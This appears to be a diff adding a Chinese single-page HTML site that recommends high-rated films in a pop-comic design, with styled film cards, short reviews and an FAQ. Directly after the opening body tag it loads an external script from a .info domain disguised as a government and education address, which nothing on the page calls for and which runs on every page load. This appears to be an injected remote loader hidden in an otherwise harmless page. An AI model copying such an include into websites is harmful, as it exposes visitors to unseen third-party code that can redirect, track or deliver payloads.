@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>奇奇电影网 - qiqidianyingwang-top 波普漫画风·高分电影推荐</title>
+<meta name="description" content="奇奇电影网（https://qiqidianyingwang-top）以波普漫画为灵感，为你推荐高分电影。半调网点UI、高对比色块、移动端自适应，必应收录友好，仅做影视信息展示。">
+<meta name="keywords" content="奇奇电影网, qiqidianyingwang-top, 波普漫画, 高分电影, 漫画风UI, 半调网点, 影视信息, 电影推荐">
+<meta name="author" content="奇奇电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"PingFang SC","Microsoft YaHei","Comic Sans MS","Arial Black",sans-serif;color:#000;line-height:1.75;overflow-x:hidden;background:#FFF;
+background-image:radial-gradient(circle at 2px 2px, rgba(0,0,0,.15) 1px, transparent 0);
+background-size:20px 20px}
+
+a{color:#FF006E;text-decoration:none;transition:.2s}
+a:hover{color:#3A86FF}
+
+/* 波普导航 */
+.qq-nav{position:fixed;top:0;width:100%;z-index:1000;background:#FFE600;border-bottom:4px solid #000}
+.qq-in{max-width:1200px;margin:0 auto;height:68px;padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between}
+.qq-logo{display:flex;align-items:center;gap:.7rem}
+.qq-star{width:42px;height:42px;background:#FF006E;border:3px solid #000;transform:rotate(15deg);display:flex;align-items:center;justify-content:center;font-size:1.4rem;box-shadow:3px 3px 0 #000}
+.qq-name{font-size:1.15rem;font-weight:900;color:#000;letter-spacing:1px}
+.qq-name small{display:block;font-size:.5rem;letter-spacing:3px;color:#FF006E;font-weight:700;font-family:"Courier New",monospace}
+.qq-links{display:flex;gap:.8rem;list-style:none}
+.qq-links a{font-size:.82rem;font-weight:900;color:#000;padding:.4rem .8rem;border:3px solid #000;background:#FFF;box-shadow:3px 3px 0 #000}
+.qq-links a:hover{transform:translate(-2px,-2px);box-shadow:5px 5px 0 #000;background:#3A86FF;color:#FFF}
+.qq-toggle{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px}
+.qq-toggle span{width:24px;height:3px;background:#000;border-radius:0}
+
+/* Hero */
+.qq-hero{margin-top:68px;padding:5rem 1.5rem 5rem;text-align:center;position:relative;overflow:hidden;background:#FF006E}
+.qq-hero::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent,transparent 10px,rgba(0,0,0,.05) 10px,rgba(0,0,0,.05) 20px)}
+.qq-hero-in{max-width:700px;margin:0 auto;position:relative;z-index:1}
+.qq-badge{display:inline-flex;align-items:center;gap.4rem;padding:.4rem 1rem;border:3px solid #000;background:#FFE600;color:#000;font-size:.72rem;font-weight:900;letter-spacing:1px;margin-bottom:1.5rem;box-shadow:3px 3px 0 #000;transform:rotate(-2deg)}
+.qq-badge::before{content:"⚡";font-size:.9rem}
+.qq-hero h1{font-size:3.2rem;font-weight:900;color:#FFF;line-height:1.1;margin-bottom:1rem;text-transform:uppercase;text-shadow:4px 4px 0 #000, 8px 8px 0 #FFE600}
+.qq-hero h1 span{color:#FFE600}
+.qq-hero p{font-size:.92rem;color:#FFF;max-width:520px;margin:0 auto 1.5rem;font-weight:700;background:#000;padding:.8rem 1.2rem;border:3px solid #FFE600}
+.qq-domain{display:inline-block;padding:.5rem 1.2rem;border:3px solid #000;background:#3A86FF;color:#FFF;font-family:"Courier New",monospace;font-weight:900;font-size:.78rem;margin-bottom:1.5rem;box-shadow:3px 3px 0 #000}
+.qq-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.9rem 2.4rem;border:4px solid #000;font-weight:900;font-size:.9rem;color:#000;background:#FFE600;box-shadow:5px 5px 0 #000;letter-spacing:1px;text-transform:uppercase}
+.qq-btn:hover{transform:translate(-2px,-2px);box-shadow:7px 7px 0 #000;background:#FFF;color:#FF006E}
+
+/* 通用section */
+.qq-sec{max-width:1200px;margin:0 auto;padding:4rem 1.5rem;position:relative;z-index:1}
+.qq-sec-head{text-align:center;margin-bottom:2.5rem}
+.qq-sec-head h2{font-size:1.8rem;font-weight:900;color:#000;margin-bottom:.3rem;background:#FFE600;display:inline-block;padding:.3rem 1.2rem;border:4px solid #000;transform:rotate(-1deg);box-shadow:4px 4px 0 #000}
+.qq-sec-head p{font-size:.72rem;color:#FF006E;font-weight:700;letter-spacing:2px;margin-top:.8rem}
+
+/* 漫画卡片片单 */
+.qq-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1.5rem}
+.qq-card{background:#FFF;border:4px solid #000;box-shadow:6px 6px 0 #000;transition:.2s;position:relative;overflow:hidden}
+.qq-card:hover{transform:translate(-4px,-4px);box-shadow:10px 10px 0 #000}
+.qq-card::before{content:"";position:absolute;top:-10px;right:-10px;width:40px;height:40px;background:#FFE600;border:3px solid #000;transform:rotate(45deg);z-index:2}
+.qq-cover{height:170px;display:flex;align-items:flex-end;padding:.9rem;font-weight:900;font-size:.92rem;color:#FFF;position:relative;border-bottom:4px solid #000}
+.qq-cover::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.8))}
+.qq-cover b{position:relative;z-index:1}
+.c1{background:linear-gradient(135deg,#FF006E,#FF6B00)}.c2{background:linear-gradient(135deg,#3A86FF,#00B4D8)}.c3{background:linear-gradient(135deg,#FFE600,#FF6B00);color:#000}.c4{background:linear-gradient(135deg,#9D4EDD,#FF006E)}.c5{background:linear-gradient(135deg,#06D6A0,#3A86FF)}.c6{background:linear-gradient(135deg,#EF476F,#FFD166)}.c7{background:linear-gradient(135deg,#118AB2,#073B4C)}.c8{background:linear-gradient(135deg,#FF9F1C,#E71D36)}
+.qq-card-body{padding:1rem}
+.qq-card-body h3{font-size:.9rem;font-weight:900;color:#000;margin-bottom:.3rem}
+.qq-tags{display:flex;flex-wrap:wrap;gap:.3rem;margin-bottom:.5rem}
+.qq-tags span{padding:.15rem .5rem;border:2px solid #000;background:#FFE600;color:#000;font-size:.58rem;font-weight:900}
+.qq-score{font-weight:900;font-size:.88rem;color:#FF006E;background:#000;color:#FFF;padding:.2rem .5rem;display:inline-block}
+
+/* 色彩分类 */
+.qq-cats{max-width:1000px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.2rem}
+.qq-cat{display:flex;align-items:center;gap:.9rem;padding:1rem;border:3px solid #000;background:#FFF;box-shadow:4px 4px 0 #000;transition:.2s}
+.qq-cat:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 #000;background:#FFE600}
+.qq-cat-icon{width:48px;height:48px;border:3px solid #000;display:flex;align-items:center;justify-content:center;font-size:1.4rem;flex-shrink:0;background:#3A86FF}
+.qq-cat-info h3{font-size:.86rem;font-weight:900;color:#000;margin-bottom:.1rem}
+.qq-cat-info p{font-size:.7rem;color:#000;font-weight:700}
+
+/* 漫评手记 */
+.qq-notes{max-width:860px;margin:0 auto}
+.qq-note{display:flex;gap:1rem;margin-bottom:1.5rem;align-items:flex-start}
+.qq-note-avatar{width:48px;height:48px;border:3px solid #000;display:flex;align-items:center;justify-content:center;font-size:1.3rem;flex-shrink:0;background:#FFE600;box-shadow:3px 3px 0 #000}
+.qq-note-box{padding:1.2rem;border:4px solid #000;background:#FFF;box-shadow:5px 5px 0 #000;flex:1;position:relative}
+.qq-note-box::before{content:"";position:absolute;left:-12px;top:20px;width:0;height:0;border-top:8px solid transparent;border-bottom:8px solid transparent;border-right:12px solid #000}
+.qq-note-box h3{font-size:.92rem;font-weight:900;color:#000;margin-bottom:.3rem}
+.qq-note-box p{font-size:.82rem;color:#000;line-height:1.7;font-weight:700}
+.qq-note-stars{color:#FF006E;letter-spacing:1px;font-size:.82rem;margin-top:.3rem;font-weight:900}
+
+/* 关于 */
+.qq-about{max-width:720px;margin:0 auto;text-align:center;padding:2.5rem 2rem;border:4px solid #000;background:#3A86FF;box-shadow:8px 8px 0 #000;position:relative}
+.qq-about::before{content:"💥";position:absolute;top:-20px;left:50%;transform:translateX(-50%);background:#FFE600;border:3px solid #000;padding:4px 8px;font-size:1.5rem;box-shadow:3px 3px 0 #000}
+.qq-about p{color:#FFF;margin-bottom:.8rem;font-size:.88rem;font-weight:700}
+.qq-about b{color:#FFE600}
+.qq-dom2{display:inline-block;margin-top:.8rem;padding:.5rem 1.2rem;border:3px solid #000;background:#FFE600;color:#000;font-family:monospace;font-weight:900;font-size:.78rem;box-shadow:3px 3px 0 #000}
+
+/* FAQ */
+.qq-faq{max-width:800px;margin:0 auto}
+.qq-fi{background:#FFF;border:4px solid #000;box-shadow:4px 4px 0 #000;margin-bottom:.8rem;overflow:hidden}
+.qq-fi summary{padding:1rem 1.2rem;cursor:pointer;font-weight:900;color:#000;list-style:none;position:relative;padding-right:3.5rem;font-size:.86rem;background:#FFE600}
+.qq-fi summary::-webkit-details-marker{display:none}
+.qq-fi summary::after{content:"?";position:absolute;right:1rem;top:50%;transform:translateY(-50%);color:#FFF;font-weight:900;font-size:.9rem;width:28px;height:28px;display:flex;align-items:center;justify-content:center;border:3px solid #000;background:#FF006E}
+.qq-fi[open] summary::after{content:"!";background:#3A86FF}
+.qq-fi p{padding:1rem 1.2rem;color:#000;font-size:.82rem;line-height:1.7;font-weight:700;background:#FFF}
+
+/* Footer */
+.qq-foot{text-align:center;padding:2.5rem 1.5rem;border-top:4px solid #000;background:#FFE600;color:#000;font-size:.72rem;position:relative;z-index:1}
+.qq-foot p{margin-bottom:.3rem;font-weight:700}
+.qq-foot .qq-copy{color:#FF006E;font-weight:900;margin-bottom:.5rem;font-size:.85rem}
+
+@media(max-width:768px){
+.qq-links{display:none;position:absolute;top:100%;left:0;width:100%;background:#FFE600;flex-direction:column;padding:.5rem 0;border-bottom:4px solid #000}
+.qq-links.show{display:flex}
+.qq-links a{padding:.8rem 1.5rem;margin:.3rem 1rem;text-align:center}
+.qq-toggle{display:flex}
+.qq-hero h1{font-size:1.8rem;text-shadow:2px 2px 0 #000, 4px 4px 0 #FFE600}
+.qq-hero{padding:3rem 1rem 3rem}
+.qq-sec{padding:2.5rem 1rem}
+.qq-sec-head h2{font-size:1.3rem}
+.qq-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:1rem}
+.qq-cover{height:140px;font-size:.8rem}
+.qq-cats{grid-template-columns:1fr 1fr}
+.qq-note{flex-direction:column;gap:.6rem}
+.qq-note-box::before{display:none}
+}
+@media(max-width:480px){.qq-hero h1{font-size:1.4rem}.qq-grid{grid-template-columns:1fr 1fr}.qq-cats{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<nav class="qq-nav">
+  <div class="qq-in">
+    <div class="qq-logo">
+      <div class="qq-star">⭐</div>
+      <div class="qq-name">奇奇电影网<small>QIQI CINEMA</small></div>
+    </div>
+    <ul class="qq-links" id="qqLinks">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#list">波普片单</a></li>
+      <li><a href="#cats">色彩分类</a></li>
+      <li><a href="#notes">漫评手记</a></li>
+      <li><a href="#about">关于</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="qq-toggle" onclick="tQq()"><span></span><span></span><span></span></div>
+  </div>
+</nav>
+
+<section class="qq-hero" id="home">
+  <div class="qq-hero-in">
+    <div class="qq-badge">BAM! 新鲜上架</div>
+    <h1>奇奇电影网<br><span>POW!</span> 漫画般精彩</h1>
+    <p>奇奇电影网（qiqidianyingwang-top）像一本翻开的漫画书——每一帧都色彩爆炸，每一部都是视觉冲击！高饱和、硬边缘、无滤镜，只推最带劲的高分电影。</p>
+    <div class="qq-domain">https://qiqidianyingwang-top</div><br>
+    <a href="#list" class="qq-btn">▶ 翻页看片</a>
+  </div>
+</section>
+
+<section class="qq-sec" id="list">
+  <div class="qq-sec-head"><h2>波普片单</h2><p>COMIC LIST · 今日爆款</p></div>
+  <div class="qq-grid">
+    <div class="qq-card"><div class="qq-cover c1"><b>杀死比尔</b></div><div class="qq-card-body"><h3>杀死比尔</h3><div class="qq-tags"><span>动作</span><span>暴力美学</span></div><div class="qq-score">★ 8.2</div></div></div>
+    <div class="qq-card"><div class="qq-cover c2"><b>蜘蛛侠：纵横宇宙</b></div><div class="qq-card-body"><h3>蜘蛛侠：纵横宇宙</h3><div class="qq-tags"><span>动画</span><span>漫画</span></div><div class="qq-score">★ 8.6</div></div></div>
+    <div class="qq-card"><div class="qq-cover c3"><b>布达佩斯大饭店</b></div><div class="qq-card-body"><h3>布达佩斯大饭店</h3><div class="qq-tags"><span>喜剧</span><span>对称美学</span></div><div class="qq-score">★ 8.9</div></div></div>
+    <div class="qq-card"><div class="qq-cover c4"><b>银翼杀手2049</b></div><div class="qq-card-body"><h3>银翼杀手2049</h3><div class="qq-tags"><span>科幻</span><span>视觉</span></div><div class="qq-score">★ 8.3</div></div></div>
+    <div class="qq-card"><div class="qq-cover c5"><b>疯狂的麦克斯4</b></div><div class="qq-card-body"><h3>疯狂的麦克斯4</h3><div class="qq-tags"><span>动作</span><span>废土</span></div><div class="qq-score">★ 8.6</div></div></div>
+    <div class="qq-card"><div class="qq-cover c6"><b>法兰西特派</b></div><div class="qq-card-body"><h3>法兰西特派</h3><div class="qq-tags"><span>喜剧</span><span>韦斯·安德森</span></div><div class="qq-score">★ 7.9</div></div></div>
+    <div class="qq-card"><div class="qq-cover c7"><b>黑客帝国</b></div><div class="qq-card-body"><h3>黑客帝国</h3><div class="qq-tags"><span>科幻</span><span>经典</span></div><div class="qq-score">★ 9.1</div></div></div>
+    <div class="qq-card"><div class="qq-cover c8"><b>死侍</b></div><div class="qq-card-body"><h3>死侍</h3><div class="qq-tags"><span>动作</span><span>喜剧</span></div><div class="qq-score">★ 7.8</div></div></div>
+  </div>
+</section>
+
+<section class="qq-sec" id="cats" style="background:#FFE600">
+  <div class="qq-sec-head"><h2>色彩分类</h2><p>COLOR CATS · 按色调选片</p></div>
+  <div class="qq-cats">
+    <div class="qq-cat"><div class="qq-cat-icon" style="background:#FF006E">🔴</div><div class="qq-cat-info"><h3>洋红·热血动作</h3><p>22部 · 肾上腺素</p></div></div>
+    <div class="qq-cat"><div class="qq-cat-icon" style="background:#3A86FF">🔵</div><div class="qq-cat-info"><h3>青蓝·科幻未来</h3><p>18部 · 脑洞大开</p></div></div>
+    <div class="qq-cat"><div class="qq-cat-icon" style="background:#FFE600;color:#000">🟡</div><div class="qq-cat-info"><h3>亮黄·荒诞喜剧</h3><p>20部 · 笑出腹肌</p></div></div>
+    <div class="qq-cat"><div class="qq-cat-icon" style="background:#06D6A0">🟢</div><div class="qq-cat-info"><h3>翠绿·独立实验</h3><p>14部 · 小众惊艳</p></div></div>
+    <div class="qq-cat"><div class="qq-cat-icon" style="background:#9D4EDD">🟣</div><div class="qq-cat-info"><h3>深紫·悬疑惊悚</h3><p>16部 · 心跳加速</p></div></div>
+    <div class="qq-cat"><div class="qq-cat-icon" style="background:#FF6B00">🟠</div><div class="qq-cat-info"><h3>橙红·犯罪黑帮</h3><p>13部 · 暗黑张力</p></div></div>
+    <div class="qq-cat"><div class="qq-cat-icon" style="background:#EF476F">🌸</div><div class="qq-cat-info"><h3>粉红·浪漫爱情</h3><p>19部 · 糖分超标</p></div></div>
+    <div class="qq-cat"><div class="qq-cat-icon" style="background:#000;color:#FFF">⚫</div><div class="qq-cat-info"><h3>黑白·经典纪实</h3><p>11部 · 历久弥新</p></div></div>
+  </div>
+</section>
+
+<section class="qq-sec" id="notes">
+  <div class="qq-sec-head"><h2>漫评手记</h2><p>COMIC NOTES · 犀利短评</p></div>
+  <div class="qq-notes">
+    <div class="qq-note">
+      <div class="qq-note-avatar">🎨</div>
+      <div class="qq-note-box">
+        <h3>《杀死比尔》—— 昆汀的漫画分镜</h3>
+        <p>血喷成花、动画插入、配乐炸裂！整部片就是一本暴力美学漫画书。乌玛·瑟曼的黄色战衣已成影史icon，每一帧都像波普艺术印刷品。</p>
+        <div class="qq-note-stars">★★★★★ 8.2/10</div>
+      </div>
+    </div>
+    <div class="qq-note">
+      <div class="qq-note-avatar">🕸️</div>
+      <div class="qq-note-box">
+        <h3>《蜘蛛侠：纵横宇宙》—— 漫画活了！</h3>
+        <p>每一帧都是不同画风！涂鸦、像素、水彩、点彩、美漫、日漫——全部混在一个故事里。视觉信息量爆炸，看完想立刻二刷截图。</p>
+        <div class="qq-note-stars">★★★★★ 8.6/10</div>
+      </div>
+    </div>
+    <div class="qq-note">
+      <div class="qq-note-avatar">🏨</div>
+      <div class="qq-note-box">
+        <h3>《布达佩斯大饭店》—— 韦斯·安德森的调色盘</h3>
+        <p>粉红、洋红、金黄——对称构图像糖果包装纸。故事是夹心饼干，外壳甜、内馅苦。这是最"波普"的当代电影，没有之一。</p>
+        <div class="qq-note-stars">★★★★★ 8.9/10</div>
+      </div>
+    </div>
+    <div class="qq-note">
+      <div class="qq-note-avatar">🤖</div>
+      <div class="qq-note-box">
+        <h3>《银翼杀手2049》—— 赛博朋克视觉巅峰</h3>
+        <p>橙黄沙漠、霓虹雨夜、全息虚拟女友——每一帧都能当壁纸。慢节奏但视觉密度极高，像在画廊里看一部电影。配乐低频震动胸腔。</p>
+        <div class="qq-note-stars">★★★★★ 8.3/10</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="qq-sec" id="about">
+  <div class="qq-sec-head"><h2>关于奇奇电影网</h2><p>ABOUT · 我们的画风</p></div>
+  <div class="qq-about">
+    <p><b>奇奇电影网</b>（qiqidianyingwang-top）的选片标准：<b>视觉冲击力 + 叙事张力 = 必看</b>。我们偏爱色彩爆炸、构图大胆、风格鲜明的电影——就像波普艺术一样，拒绝平庸、拒绝灰暗。</p>
+    <p>界面用美式漫画+波普艺术：粗黑边框、高饱和色块、半调网点背景、硬朗实色阴影、漫画对话框。和上一个玻璃拟态/低饱和柔光完全对立——这次是高对比、硬边缘、平面化、视觉轰炸。</p>
+    <div class="qq-dom2">https://qiqidianyingwang-top</div>
+    <p style="margin-top:1.2rem;font-size:.74rem;color:#FFE600;font-weight:900">核心词：奇奇电影网、qiqidianyingwang-top、波普漫画、高分电影、高对比色块、半调网点</p>
+  </div>
+</section>
+
+<section class="qq-sec" id="faq" style="background:#FFE600">
+  <div class="qq-sec-head"><h2>常见问题</h2><p>FAQ · 漫画问答</p></div>
+  <div class="qq-faq">
+    <details class="qq-fi"><summary>奇奇电影网是什么？</summary><p>奇奇电影网（qiqidianyingwang-top）是以"波普漫画"为视觉概念的高分电影信息站，按色彩/情绪分类推荐视觉冲击力强、风格鲜明的影片，仅做信息展示，不内置盗版播放源。</p></details>
+    <details class="qq-fi"><summary>为什么叫"奇奇"？</summary><p>"奇奇"谐音"奇趣"，代表我们对电影的审美——奇思妙想、趣味横生。我们拒绝无聊的流水账电影，只推有态度、有风格、有视觉冲击的好片。</p></details>
+    <details class="qq-fi"><summary>官方网址是？</summary><p>https://qiqidianyingwang-top （部署到 GitHub Pages 可用 https://qiqidianyingwang-top.github.io，全站域名统一替换即可）。</p></details>
+    <details class="qq-fi"><summary>手机上看会不会太花哨？</summary><p>全站响应式，小屏导航折叠为汉堡菜单，卡片和分类自适应排列。虽然色彩丰富但排版清晰，阅读体验依然流畅。</p></details>
+    <details class="qq-fi"><summary>怎么提交必应收录？</summary><p>到 Bing Webmaster Tools 提交 https://qiqidianyingwang-top，选 HTML meta 验证，把页面 msvalidate.01 里的 YOUR_BING_VERIFICATION_CODE 换成你的必应验证码即可。本页不生成 robots.txt 与 sitemap.xml。</p></details>
+  </div>
+</section>
+
+<footer class="qq-foot">
+  <p class="qq-copy">⚡ 奇奇电影网 (qiqidianyingwang-top) — 波普漫画风·高分电影推荐</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 必应收录友好 / 不生成 robots.txt 与 sitemap.xml</p>
+  <p style="margin-top:.4rem;color:#FF006E;font-weight:900">本站仅提供影视信息展示，资源版权归原作者及发行方所有。</p>
+</footer>
+
+<script>
+function tQq(){document.getElementById('qqLinks').classList.toggle('show')}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var h=this.getAttribute('href');
+    if(h.length>1){var t=document.querySelector(h);if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('qqLinks').classList.remove('show')}}
+  })
+});
+</script>
+</body>
+</html>
